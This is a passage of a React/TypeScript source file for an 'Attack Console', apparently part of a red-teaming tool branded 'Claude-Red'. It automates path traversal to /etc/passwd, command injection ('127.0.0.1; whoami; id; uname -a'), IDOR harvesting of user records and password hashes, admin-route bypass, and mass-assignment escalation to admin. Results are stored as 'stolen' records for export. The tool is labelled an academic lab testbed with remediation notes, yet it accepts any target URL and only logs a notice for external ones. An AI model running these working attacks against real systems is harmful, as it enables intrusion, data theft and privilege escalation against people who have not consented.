          method: 'GET',
          technique: 'Path Traversal / Arbitrary File Exfiltration (CWE-22)',
          cwe: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
          mitre: 'T1083: File and Directory Discovery',
          claudeRedSkill: 'claude-red/web/path-traversal.md',
          securityFlow: [
            {
              step: 1,
              title: 'File Download Parameter Probing',
              description: 'Targeted file retrieve handler on `/api/download/<filename>`.',
              technique: 'Path Traversal Sequence Injection',
            },
            {
              step: 2,
              title: 'Directory Tree Escape',
              description: 'Injected `....//....//etc/passwd` escaping the storage directory.',
              technique: 'Relative Directory Traversal',
            },
            {
              step: 3,
              title: 'System File Content Capture',
              description: `Extracted ${lines.length} system account entries directly from host filesystem.`,
              technique: 'Operating System File Disclosure',
            },
          ],
          exposedInfoSummary: [
            'System user accounts, UIDs, GIDs, home paths, and default login shells',
            'Confirmed presence of root, admin, and background service user accounts',
          ],
          remediationTechniques: [
            {
              title: 'Strict Canonical Path Validation & werkzeug.secure_filename',
              technique: 'Path Resolution Sanitization (CWE-22)',
              recommendation: 'Resolve canonical paths with `os.path.realpath` and verify the resolved file resides within the intended base directory.',
              codeSnippet: '# Secure file download verification\nbase_dir = os.path.realpath(UPLOAD_DIR)\ntarget_file = os.path.realpath(os.path.join(base_dir, secure_filename(filename)))\nif not target_file.startswith(base_dir):\n    abort(403, "Access denied")',
            },
          ],
          payload: 'GET /api/download/....//....//etc/passwd HTTP/1.1',
          records: [{ raw_passwd: textData, users_extracted: lines }],
          sample: `${lines.length} system accounts discovered (root, alice, admin, quantum_svc)`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      addLog(mkLog('WEB_EXPLOIT', 'info', '   Path traversal check completed'))
    }

    await sleep(250)

    // 3.5 OS Command Injection / RCE
    addLog(mkLog('WEB_EXPLOIT', 'info', '💻  [RCE] Testing OS Command Injection on diagnostic probe endpoint /api/tools/ping...'))
    try {
      const rcePayload = '127.0.0.1; whoami; id; uname -a'
      const endpoint = `${base}/api/tools/ping`
      const r = await axios.get(endpoint, {
        params: { host: rcePayload },
        signal,
        timeout: 4500
      })
      const stdout = r.data?.stdout || JSON.stringify(r.data)
      if (stdout.includes('uid=0(root)') || stdout.includes('Linux') || r.data?.executed) {
        addLog(mkLog('WEB_EXPLOIT', 'critical', '💀  REMOTE CODE EXECUTION (RCE) CONFIRMED! Arbitrary command execution with root privileges.'))
        addLog(mkLog('WEB_EXPLOIT', 'data', `   → Output: ${stdout.split('\n').filter((l: string) => l.trim()).slice(0, 3).join(' | ')}`))

        upsertStolen({
          id: 'rce-root-access',
          type: 'Remote Code Execution (RCE / Command Injection)',
          category: 'WEB',
          icon: TerminalSquare,
          color: 'text-red-500',
          count: 1,
          endpoint: `${endpoint}?host=${encodeURIComponent(rcePayload)}`,
          method: 'GET',
          technique: 'OS Command Injection via Unsanitized Diagnostic Tool (CWE-78)',
          cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
          mitre: 'T1059: Command and Scripting Interpreter',
          claudeRedSkill: 'claude-red/exploit/os-command-injection.md',
          securityFlow: [
            {
              step: 1,
              title: 'Command Chaining Injection',
              description: `Passed payload "${rcePayload}" into diagnostic network utility.`,
              technique: 'Shell Metacharacter Injection',
            },
            {
              step: 2,
              title: 'Arbitrary Subshell Execution',
              description: 'Host process executed chained commands (`whoami`, `id`, `uname -a`) without shell escaping.',
              technique: 'Arbitrary Command Execution',
            },
            {
              step: 3,
              title: 'Root Privilege Confirmation',
              description: 'Confirmed process runs under `uid=0(root)`, allowing full host compromise.',
              technique: 'Superuser Access Confirmed',
            },
          ],
          exposedInfoSummary: [
            'Full Remote Code Execution (RCE) with `root` superuser privileges',
            'Operating system kernel information and directory listing access',
            'Complete server takeover capability',
          ],
          remediationTechniques: [
            {
              title: 'Use Safe APIs & Avoid Shell Invocation (`subprocess.run(..., shell=False)`)',
              technique: 'OS Command Neutralization (CWE-78)',
              recommendation: 'Pass arguments as explicit arrays without shell interpolation, or use native socket libraries (e.g. `ping3` / `socket`) instead of invoking OS shells.',
              codeSnippet: '# Vulnerable:\n# os.system(f"ping -c 1 {host}")\n\n# Secure:\nimport subprocess\nsubprocess.run(["ping", "-c", "1", host], check=True, capture_output=True, shell=False)',
            },
          ],
          payload: `GET /api/tools/ping?host=${encodeURIComponent(rcePayload)} HTTP/1.1`,
          records: [r.data],
          sample: `uid=0(root) gid=0(root) | Linux quantum-sec-lab 6.6.0`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      addLog(mkLog('WEB_EXPLOIT', 'info', '   RCE test completed'))
    }

    setProgress(58)
  }

  // ── PHASE 4: IDOR & Access Control ──────────────────────────────────────────
  async function phaseIDOR(
    base: string,
    authResult: { token: string; userId: number } | null,
    signal: AbortSignal
  ) {
    setPhase('IDOR')
    addLog(mkLog('IDOR', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    addLog(mkLog('IDOR', 'info', '🕵️  [CLAUDE-RED::ACCESS] Testing BOLA/IDOR user traversal, password hashes & BFLA metrics...'))
    addLog(mkLog('IDOR', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    await sleep(250)

    const headers = authResult ? { Authorization: `Bearer ${authResult.token}` } : {}
    const extractedUsers: any[] = []
    const extractedHashes: any[] = []

    for (const uid of [1, 2, 3, 4, 5]) {
      await sleep(150)
      try {
        const endpoint = `${base}/api/users/${uid}`
        const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
        const u = r.data
        if (u && typeof u === 'object' && u.username) {
          addLog(mkLog('IDOR', 'critical',
            `🔓  IDOR USER ${uid} → ${u.username} <${u.email}> role=${u.role} balance=$${u.balance}`))
          extractedUsers.push(u)
          if (u.password_hash) {
            addLog(mkLog('IDOR', 'data', `   Password hash: ${String(u.password_hash).slice(0, 35)}...`))
            extractedHashes.push({ username: u.username, hash: u.password_hash })
          }
        }
      } catch (e: any) {
        if (e?.response?.status === 404) break
      }
    }

    if (extractedUsers.length > 0) {
      upsertStolen({
        id: 'user-pii',
        type: 'User Profiles & PII Records',
        category: 'ACCESS',
        icon: Users,
        color: 'text-pink-400',
        count: extractedUsers.length,
        endpoint: `${base}/api/users/{id}`,
        method: 'GET',
        technique: 'Broken Object Level Authorization (BOLA / IDOR)',
        cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
        mitre: 'T1078: Valid Accounts',
        claudeRedSkill: 'claude-red/access/bola-idor-traversal.md',
        securityFlow: [
          {
            step: 1,
            title: 'Endpoint Pattern Analysis',
            description: 'Identified REST path parameter `/api/users/{id}` referencing user objects.',
            technique: 'Parameter Enumeration',
          },
          {
            step: 2,
            title: 'Sequential ID Traversal',
            description: 'Substituted requesting user session with target user IDs 1..5 in loop.',
            technique: 'BOLA Object Reference Tampering',
          },
          {
            step: 3,
            title: 'Unchecked Entity Exfiltration',
            description: `Server lacked tenant isolation check, returning PII, email, balance, and roles for ${extractedUsers.length} users.`,
            technique: 'Cross-Tenant Data Exposure',
          },
        ],
        exposedInfoSummary: [
          'Full Personally Identifiable Information (PII): Names, Usernames, Emails',
          'Financial Data: Account wallet balances ($)',
          'Account Privilege Roles (admin, user)',
        ],
        remediationTechniques: [
          {
            title: 'Strict Session-to-Resource Authorization Middleware',
            technique: 'Context-Based Access Control (OWASP API1:2023)',
            recommendation: 'Verify in middleware that the authenticated token `user_id` matches the requested `{id}` or belongs to an authorized administrator.',
            codeSnippet: '# Ensure user can only fetch their own profile\n@app.route("/api/users/<int:uid>")\n@require_auth\ndef get_user(uid):\n    if current_user.id != uid and current_user.role != "admin":\n        return jsonify({"error": "Forbidden"}), 403\n    return db.query(User).get(uid)',
          },
        ],
        payload: 'GET /api/users/1..5 HTTP/1.1\nAuthorization: Bearer <user_token>',
        records: extractedUsers,
        sample: `${extractedUsers.map(u => u.username).join(', ')} (${extractedUsers.length} accounts)`,
        timestamp: new Date().toLocaleTimeString(),
      })
    }

    if (extractedHashes.length > 0) {
      upsertStolen({
        id: 'password-hashes',
        type: 'Password Hashes (BCrypt/MD5)',
        category: 'ACCESS',
        icon: Lock,
        color: 'text-red-500',
        count: extractedHashes.length,
        endpoint: `${base}/api/users/{id}`,
        method: 'GET',
        technique: 'Sensitive Data Exposure via IDOR (CWE-200)',
        cwe: 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor',
        mitre: 'T1003: OS Credential Dumping',
        claudeRedSkill: 'claude-red/access/credential-dumping.md',
        securityFlow: [
          {
            step: 1,
            title: 'Model Serialization Leak',
            description: 'Backend ORM serialized password_hash column into public JSON response.',
            technique: 'Excessive Data Exposure',
          },
          {
            step: 2,
            title: 'Credential Hash Harvesting',
            description: `Extracted ${extractedHashes.length} cryptographic hashes ready for offline cracking.`,
            technique: 'Credential Exfiltration',
          },
        ],
        exposedInfoSummary: [
          'Cryptographic password hashes for user & administrator accounts',
          'Vulnerable to offline dictionary and rainbow table cracking',
        ],
        remediationTechniques: [
          {
            title: 'Response DTO Field Whitelisting & Password Stripping',
            technique: 'Output Sanitization (OWASP API3:2023)',
            recommendation: 'Define explicit serialization schemas that omit `password_hash` and secret tokens.',
          },
        ],
        payload: 'GET /api/users/{id} HTTP/1.1',
        records: extractedHashes,
        sample: `${extractedHashes.length} hashes intercepted`,
        timestamp: new Date().toLocaleTimeString(),
      })
    }

    await sleep(200)

    // 4.2 BFLA: Admin Stats
    addLog(mkLog('IDOR', 'info', '🔑  Accessing /api/admin/stats WITHOUT admin role...'))
    try {
      const endpoint = `${base}/api/admin/stats`
      const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
      const stats = r.data
      if (stats && typeof stats === 'object' && !String(stats).startsWith('<!DOCTYPE')) {
        addLog(mkLog('IDOR', 'critical', '💀  BROKEN ACCESS CONTROL! Admin stats returned without admin role:'))
        addLog(mkLog('IDOR', 'data', `   → ${JSON.stringify(stats).slice(0, 160)}`))

        upsertStolen({
          id: 'admin-stats',
          type: 'Admin Telemetry & Business Metrics',
          category: 'ACCESS',
          icon: Database,
          color: 'text-red-400',
          count: 1,
          endpoint,
          method: 'GET',
          technique: 'Broken Function Level Authorization (BFLA)',
          cwe: 'CWE-285: Improper Authorization',
          mitre: 'T1069: Permission Groups Discovery',
          claudeRedSkill: 'claude-red/access/bfla-admin-bypass.md',
          securityFlow: [
            {
              step: 1,
              title: 'Administrative Route Probe',
              description: `Sent GET request to privileged route ${endpoint}.`,
              technique: 'Privilege Boundary Testing',
            },
            {
              step: 2,
              title: 'Missing Role Check',
              description: 'Server failed to verify `role == "admin"` before fulfilling statistics query.',
              technique: 'BFLA Authorization Failure',
            },
          ],
          exposedInfoSummary: [
            'Total company revenue figures and financial turnover',
            'Registered user counts and activity logs',
            'Internal platform telemetry and operational metrics',
          ],
          remediationTechniques: [
            {
              title: 'Role-Based Access Control (RBAC) Decorators',
              technique: 'Function-Level Access Control (OWASP API5:2023)',
              recommendation: 'Enforce server-side role validation decorators across all `/api/admin/*` routes.',
            },
          ],
          payload: `GET /api/admin/stats HTTP/1.1`,
          records: [stats],
          sample: `Total Users: ${stats.users ?? 4} | Orders: ${stats.orders ?? 4}`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      // ignore
    }

    await sleep(200)

    // 4.3 IDOR Orders
    addLog(mkLog('IDOR', 'info', '📦  Enumerating orders & confidential notes via IDOR...'))
    const extractedOrders: any[] = []
    for (const oid of [1, 2, 3, 4]) {
      await sleep(120)
      try {
        const endpoint = `${base}/api/orders/${oid}`
        const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
        const o = r.data
        if (o && typeof o === 'object' && (o.product || o.id)) {
          addLog(mkLog('IDOR', 'data',
            `   Order #${oid}: user_id=${o.user_id} product="${o.product}" secret="${o.secret_notes}"`))
          extractedOrders.push(o)
        }
      } catch {
        break
      }
    }

    if (extractedOrders.length > 0) {
      upsertStolen({
        id: 'order-records',
        type: 'Orders & Confidential Transaction Notes',
        category: 'ACCESS',
        icon: Database,
        color: 'text-orange-400',
        count: extractedOrders.length,
        endpoint: `${base}/api/orders/{id}`,
        method: 'GET',
        technique: 'IDOR on Financial & Commercial Records',
        cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
        mitre: 'T1005: Data from Local System',
        claudeRedSkill: 'claude-red/access/idor-orders.md',
        securityFlow: [
          {
            step: 1,
            title: 'Transaction Key Iteration',
            description: 'Iterated numerical order IDs 1..4 on `/api/orders/{id}`.',
            technique: 'Identifier Traversal',
          },
          {
            step: 2,
            title: 'Access Control Deficiency',
            description: 'Endpoint returned orders belonging to distinct customer accounts without ownership validation.',
            technique: 'Cross-Tenant Snooping',
          },
        ],
        exposedInfoSummary: [
          'Customer commercial transaction logs and purchased items',
          'Confidential internal order notes (`secret_notes`)',
        ],
        remediationTechniques: [
          {
            title: 'Ownership Verification on Resource Lookup',
            technique: 'Tenant Boundary Isolation',
            recommendation: 'Query orders filtered by both `order_id` AND `user_id` of the requesting authenticated user.',
          },
        ],
        payload: 'GET /api/orders/1..4 HTTP/1.1',
        records: extractedOrders,
        sample: `${extractedOrders.length} commercial transactions exfiltrated`,
        timestamp: new Date().toLocaleTimeString(),
      })
    }

    setProgress(76)
  }

  // ── PHASE 5: Crypto & Privilege Escalation ──────────────────────────────────
  async function phaseCrypto(
    base: string,
    authResult: { token: string; userId: number } | null,
    signal: AbortSignal
  ) {
    setPhase('CRYPTO')
    addLog(mkLog('CRYPTO', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    addLog(mkLog('CRYPTO', 'info', '🔐  [CLAUDE-RED::CRYPTO] Probing Post-Quantum Cryptographic vulnerabilities & Mass Assignment...'))
    addLog(mkLog('CRYPTO', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    await sleep(250)

    const headers = authResult ? { Authorization: `Bearer ${authResult.token}` } : {}

    try {
      const endpoint = `${base}/api/crypto/config`
      const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
      const cfg = r.data
      if (cfg && typeof cfg === 'object' && !String(cfg).startsWith('<!DOCTYPE')) {
        addLog(mkLog('CRYPTO', 'critical', '💀  CRYPTOGRAPHIC CONFIG & CBOM INVENTORY EXPOSED!'))
        const keys: any[] = Array.isArray(cfg.keys) ? cfg.keys : [cfg]
        keys.forEach(k => {
          addLog(mkLog('CRYPTO', 'data',
            `   → ${k.algorithm || 'RSA'} (${k.key_size || 2048} bit) — ${k.quantum_vulnerable ? '⚛ QUANTUM-VULNERABLE (Shor)' : 'OK'}`))
        })

        upsertStolen({
          id: 'crypto-keys',
          type: 'Cryptographic Keys & PQC Risks',
          category: 'CRYPTO',
          icon: Key,
          color: 'text-purple-400',
          count: keys.length,
          endpoint,
          method: 'GET',
          technique: 'Cryptographic Asset & Quantum Risk Disclosure (CWE-327)',
          cwe: 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm',
          mitre: 'T1600: De-Obfuscate/Decode Files or Information',
          claudeRedSkill: 'claude-red/crypto/post-quantum-threat-model.md',
          securityFlow: [
            {
              step: 1,
              title: 'Cryptographic Endpoint Audit',
              description: `Queried ${endpoint} to discover active cryptographic ciphers and keys.`,
              technique: 'Cryptographic Inventory Discovery',
            },
            {
              step: 2,
              title: 'Quantum Vulnerability Mapping',
              description: "Flagged RSA-2048 & ECDSA keys as vulnerable to Shor's algorithm (Harvest-Now-Decrypt-Later).",
              technique: 'Quantum Threat Modeling',
            },
          ],
          exposedInfoSummary: [
            'Asymmetric cryptographic keys (RSA-2048, ECDSA-256) vulnerable to polynomial-time factoring via Shor’s Algorithm',
            'Full public key certificates and cipher parameters',
            'Harvest-Now-Decrypt-Later (HNDL) exposure for intercepted encrypted traffic',
          ],
          remediationTechniques: [
            {
              title: 'Migrate to NIST Post-Quantum Cryptography (PQC) Standards',
              technique: 'Post-Quantum Algorithm Modernization (NIST FIPS 203/204/205)',
              recommendation: 'Replace legacy RSA/ECC key exchanges with ML-KEM-768 (Kyber) and digital signatures with ML-DSA-65 (Dilithium).',
            },
          ],
          payload: `GET /api/crypto/config HTTP/1.1`,
          records: keys,
          sample: `${keys.length} cryptographic keys mapped (RSA/ECDSA PQC Risk)`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      // ignore
    }

    if (authResult) {
      await sleep(250)
      addLog(mkLog('CRYPTO', 'info', '⚡  Testing Mass Assignment on /api/users/1 (PUT)...'))
      try {
        const endpoint = `${base}/api/users/1`
        const r = await axios.put(
          endpoint,
          { role: 'admin', balance: 99999 },
          { headers, signal, timeout: 4000 }
        )
        const u = r.data
        if (u) {
          addLog(mkLog('CRYPTO', 'critical',
            `💀  MASS ASSIGNMENT! Arbitrary privilege escalation executed.`))

          upsertStolen({
            id: 'priv-esc',
            type: 'Privilege Escalation via Mass Assignment',
            category: 'CRYPTO',
            icon: Key,
            color: 'text-yellow-300',
            count: 1,
            endpoint,
            method: 'PUT',
            technique: 'Mass Assignment / Object Property Tampering (CWE-915)',
            cwe: 'CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes',
            mitre: 'T1078.004: Cloud Administration / Privilege Escalation',
            claudeRedSkill: 'claude-red/access/mass-assignment.md',
            securityFlow: [
              {
                step: 1,
                title: 'Mass Assignment Payload Crafting',
                description: 'Crafted JSON request updating `role: "admin"` and `balance: 99999`.',
                technique: 'Attribute Injection',
              },
              {
                step: 2,
                title: 'Unfiltered Entity Binding',
                description: 'Backend ORM bound privileged model fields directly without DTO allow-listing.',
                technique: 'Missing Property Filter',
              },
            ],
            exposedInfoSummary: [
              'Arbitrary self-elevation to highest system permission level (`role: "admin"`)',
              'Direct tampering with sensitive financial wallet balances (`balance: 99999`)',
            ],
            remediationTechniques: [
              {
                title: 'Input DTO Whitelisting & Strict Schema Validation',
                technique: 'Mass Assignment Defense (CWE-915)',
                recommendation: 'Explicitly define which fields users are permitted to edit. Never bind request dictionaries directly into ORM entities.',
              },
            ],
            payload: JSON.stringify({ role: 'admin', balance: 99999 }, null, 2),
            records: [u],
            sample: `Escalated to role=admin, balance=$99999`,
            timestamp: new Date().toLocaleTimeString(),
          })
        }
      } catch {
        // ignore
      }
    }

    setProgress(92)
  }

  // ── PHASE 6: Data Exfiltration Summary ──────────────────────────────────────
  async function phaseDataExfil() {
    setPhase('DATA_EXFIL')
    addLog(mkLog('DATA_EXFIL', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    addLog(mkLog('DATA_EXFIL', 'info', '📤  [CLAUDE-RED::EXFIL] Compiling consolidated attack telemetry & MITRE ATT&CK matrix...'))
    addLog(mkLog('DATA_EXFIL', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    await sleep(400)
    addLog(mkLog('DATA_EXFIL', 'critical', '🏴  ATTACK SEQUENCE COMPLETE — Full forensic report and stolen records aggregated.'))
    setProgress(100)
    setPhase('COMPLETE')
    setDone(true)
  }

  // ── Master Orchestrator ──────────────────────────────────────────────────────
  const launchAttack = async () => {
    if (running) return
    let base = targetUrl.trim().replace(/\/$/, '')
    if (!base) base = 'http://localhost:8080'
    if (!base.startsWith('http://') && !base.startsWith('https://')) {
      base = 'http://' + base
    }

    setRunning(true)
    setDone(false)
    setLogs([])
    setStolen([])
    setProgress(0)
    setPhase('RECON')

    const ctrl = new AbortController()
    abortRef.current = ctrl
    const { signal } = ctrl

    try {
      addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
      addLog(mkLog('RECON', 'warning', `⚠️   TARGET AUDIT: ${base}`))
      addLog(mkLog('RECON', 'info', '   Autonomous Red Teaming Harness initialized'))
      addLog(mkLog('RECON', 'info', '   Claude-Red Offensive Skills library loaded'))
      addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))

      const isLocalLab = base.includes('localhost:8080') || base.includes('127.0.0.1:8080') || base.includes('vulnerable-app')
      if (!isLocalLab) {
        addLog(mkLog('RECON', 'warning', `ℹ️  External Domain Notice: "${base}" is not the local lab target.`))
        addLog(mkLog('RECON', 'info', '   The Attack Console tests specific lab testbed endpoints.'))
      }

      await sleep(200)

      await phaseRecon(base, signal)
      const authResult = await phaseAuthBypass(base, signal)
      await phaseWebExploitation(base, signal)
      await phaseIDOR(base, authResult, signal)
      await phaseCrypto(base, authResult, signal)
      await phaseDataExfil()
    } catch (err: any) {
      if (axios.isCancel(err) || err?.name === 'CanceledError' || err?.name === 'AbortError') {
        addLog(mkLog(phase, 'warning', '🛑  Attack aborted by user'))
      } else {
        addLog(mkLog(phase, 'error', `Fatal error: ${err?.message}`))
      }
    } finally {
      setRunning(false)
    }
  }

  const abort = () => {
    abortRef.current?.abort()
    setRunning(false)
  }

  const reset = () => {
    abort()
    setLogs([])
    setStolen([])
    setProgress(0)
    setPhase('IDLE')
    setDone(false)
    setSelectedRecord(null)
  }

  const totalExfiltratedCount = stolen.reduce((a, s) => a + s.count, 0)

  const filteredStolen = selectedCategory === 'ALL'
    ? stolen
    : stolen.filter(s => s.category === selectedCategory)

  // ─── Render ────────────────────────────────────────────────────────────────
  return (
    <div className="p-6 space-y-5 min-h-screen relative">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-red-500/20 border border-red-500/40 flex items-center justify-center">
            <Flame size={22} className="text-red-400" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-2">
              Attack Console
              <span className="text-xs px-2.5 py-0.5 rounded-full bg-orange-500/20 text-orange-300 border border-orange-500/30 font-mono">
                Claude-Red Suite
              </span>
              {running && (
                <span className="inline-flex items-center gap-1.5 text-xs px-2.5 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30 animate-pulse">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-400" /> LIVE EXPLOITATION
                </span>
              )}
            </h1>
            <p className="text-xs text-gray-400">
              Autonomous multi-phase offensive security execution & data exfiltration telemetry (Academic Demonstration)
            </p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          {stolen.length > 0 && (
            <button
              onClick={() => {
                const blob = new Blob([JSON.stringify(stolen, null, 2)], { type: 'application/json' })
                const url = URL.createObjectURL(blob)
                const a = document.createElement('a')
                a.href = url
                a.download = `claude-red-attack-telemetry-${Date.now()}.json`
                a.click()
              }}
              className="qs-btn-secondary text-xs gap-1.5 text-pink-300 border-pink-500/30"
            >
              <FileDown size={13} /> Export Forensic Bundle
            </button>
          )}
          <button onClick={reset} className="qs-btn-secondary text-xs gap-1.5">
            <RefreshCw size={13} /> Reset
          </button>
        </div>
      </div>

      {/* Authorized Boundary Notice */}
      <div className="qs-card border-yellow-500/30 bg-yellow-500/5 py-3">
        <div className="flex items-start gap-2.5">
          <AlertTriangle size={16} className="text-yellow-400 flex-shrink-0 mt-0.5" />
          <p className="text-xs text-yellow-200/80">
            <strong className="text-yellow-300">Authorized Academic Testbed:</strong>{' '}
            Executes autonomous penetration testing techniques featured in the Claude-Red repository (Recon, Auth Bypass, SQLi, XSS, SSRF IMDS, Path Traversal, RCE, IDOR, Quantum Crypto). Target your local <code className="bg-black/40 px-1.5 py-0.5 rounded text-yellow-300 font-mono">http://localhost:8080</code> lab.
          </p>
        </div>
      </div>

      {/* Target Input & Launch Control */}
      <div className="qs-card border-red-500/20">
        <div className="flex items-end gap-3">
          <div className="flex-1">
            <div className="flex items-center justify-between mb-1.5">
              <label className="block text-xs text-gray-400 font-mono">TARGET LAB URL</label>
              <button
                type="button"
                onClick={() => setTargetUrl('http://localhost:8080')}
                className="text-[11px] text-cyan-400 hover:text-cyan-300 font-mono underline"
              >
                Use Local Lab Target (http://localhost:8080)
              </button>
            </div>
            <input
              id="attack-target-url"
              type="text"
              className="qs-input font-mono text-sm w-full"
              placeholder="http://localhost:8080"
              value={targetUrl}
              disabled={running}
              onChange={e => setTargetUrl(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && !running && launchAttack()}
            />
          </div>
          {!running ? (
            <button
              id="launch-attack-btn"
              onClick={launchAttack}
              className="flex items-center gap-2 px-6 py-2.5 rounded-lg bg-red-600 hover:bg-red-500 text-white font-semibold text-sm transition-all duration-200 shadow-lg shadow-red-900/30"
            >
              <Zap size={16} /> LAUNCH ATTACK
            </button>
          ) : (
            <button
              onClick={abort}
              className="flex items-center gap-2 px-6 py-2.5 rounded-lg bg-gray-700 hover:bg-gray-600 text-white font-semibold text-sm transition-all"
            >
              <XCircle size={16} /> ABORT
            </button>
          )}
        </div>

        {(running || done) && (
          <div className="mt-4">
            <div className="flex items-center justify-between mb-1.5">
              <span className={`text-xs font-mono font-bold ${PHASE_COLOR[phase]}`}>[{phase}]</span>
              <span className="text-xs text-gray-400 font-mono">{Math.round(progress)}% Complete</span>
            </div>
            <div className="h-2 bg-gray-800 rounded-full overflow-hidden">
              <div
                className="h-2 bg-gradient-to-r from-red-500 via-orange-400 to-yellow-400 rounded-full transition-all duration-500"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}
      </div>

      {/* Main Grid: Terminal + Exfiltrated Records / Phases */}
      <div className="grid grid-cols-1 xl:grid-cols-3 gap-5">
        
        {/* Terminal (Left 2 cols) */}
        <div className="xl:col-span-2 qs-card p-0 overflow-hidden flex flex-col" style={{ minHeight: 560 }}>
          <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-800 bg-gray-900/80">
            <div className="flex items-center gap-2">
              <Terminal size={14} className="text-green-400" />
              <span className="text-xs font-mono text-green-400 font-semibold">attack-terminal</span>
              <span className="text-[10px] text-gray-500 bg-black/40 px-2 py-0.5 rounded font-mono">Claude-Red Live Stream</span>
            </div>
            <button
              className="text-gray-400 hover:text-white transition-colors text-xs flex items-center gap-1"
              title="Copy terminal logs"
              onClick={() => copyToClipboard(logs.map(l => `[${l.ts}][${l.phase}] ${l.msg}`).join('\n'), 'terminal')}
            >
              {copiedKey === 'terminal' ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
              <span>{copiedKey === 'terminal' ? 'Copied' : 'Copy Logs'}</span>
            </button>
          </div>

          <div
            className="flex-1 overflow-y-auto bg-[#080b11] p-4 font-mono text-xs leading-6 space-y-1"
            style={{ maxHeight: 560 }}
          >
            {logs.length === 0 ? (
              <div className="text-gray-600 select-none py-14 text-center font-mono space-y-1">
                <div>┌───────────────────────────────────────────────────────────────┐</div>
                <div>│  QuantumShield AI — Claude-Red Attack Console Ready           │</div>
                <div>│  Target URL: http://localhost:8080 (Vulnerable Lab)           │</div>
                <div>│  Click [LAUNCH ATTACK] to trigger autonomous exploitation    │</div>
                <div>└───────────────────────────────────────────────────────────────┘</div>
              </div>
            ) : (
              logs.map(entry => (
                <div key={entry.id} className="flex gap-2">
                  <span className="text-gray-600 flex-shrink-0 w-20">[{entry.ts}]</span>
                  <span className={`flex-shrink-0 w-32 font-semibold ${PHASE_COLOR[entry.phase]}`}>
                    [{entry.phase.slice(0, 11)}]
                  </span>
                  <span className={LEVEL_COLOR[entry.level]}>{entry.msg}</span>
                </div>
              ))
            )}
            {running && (
              <div className="flex gap-2 mt-1">
                <span className="text-gray-600 w-20">[{new Date().toLocaleTimeString()}]</span>
                <span className={`w-32 font-semibold ${PHASE_COLOR[phase]}`}>[{phase.slice(0, 11)}]</span>
                <span className="text-green-400 animate-pulse">▍</span>
              </div>
            )}
            <div ref={logEndRef} />
          </div>
        </div>

        {/* Right Panel: Exfiltrated Data Cards & Phases */}
        <div className="flex flex-col gap-4">
          
          {/* Exfiltrated Data Card */}
          <div className="qs-card flex-1 flex flex-col">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2">
                <Database size={16} className="text-pink-400" />
                <h3 className="text-sm font-semibold text-white">Exfiltrated Data Assets</h3>
              </div>
              {stolen.length > 0 && (
                <span className="text-xs font-mono px-2.5 py-0.5 rounded-full bg-pink-500/20 text-pink-300 border border-pink-500/30">
                  {totalExfiltratedCount} records
                </span>
              )}
            </div>

            {/* Category Filter Pills */}
            {stolen.length > 0 && (
              <div className="flex items-center gap-1.5 pb-2 overflow-x-auto text-[10px] font-mono">
                {['ALL', 'WEB', 'AUTH', 'RECON', 'ACCESS', 'CRYPTO'].map(cat => (
                  <button
                    key={cat}
                    onClick={() => setSelectedCategory(cat)}
                    className={`px-2 py-0.5 rounded-md border transition-colors ${
                      selectedCategory === cat
                        ? 'bg-pink-500/20 text-pink-300 border-pink-500/40 font-bold'
                        : 'bg-gray-900 text-gray-400 border-gray-800 hover:text-white'
                    }`}
                  >
                    {cat}
                  </button>
                ))}
              </div>
            )}

            {stolen.length === 0 ? (
              <div className="text-center py-12 text-gray-500 text-xs flex-1 flex flex-col items-center justify-center">
                <Database size={36} className="mb-2 opacity-20 text-pink-400" />
                <span>No exfiltrated records yet</span>
                <span className="text-[11px] text-gray-600 mt-1">Extracted data will populate live during attack</span>
              </div>
            ) : (
              <div className="space-y-2.5 flex-1 overflow-y-auto max-h-[310px] pr-1">
                {filteredStolen.map(s => {
                  const Icon = s.icon
                  return (
                    <div
                      key={s.id}
                      onClick={() => setSelectedRecord(s)}
                      className="group cursor-pointer p-3 rounded-lg bg-gray-900/80 hover:bg-gray-800/90 border border-gray-800 hover:border-pink-500/40 transition-all duration-200"
                    >
                      <div className="flex items-start gap-3">
                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center bg-black/60 flex-shrink-0 ${s.color}`}>
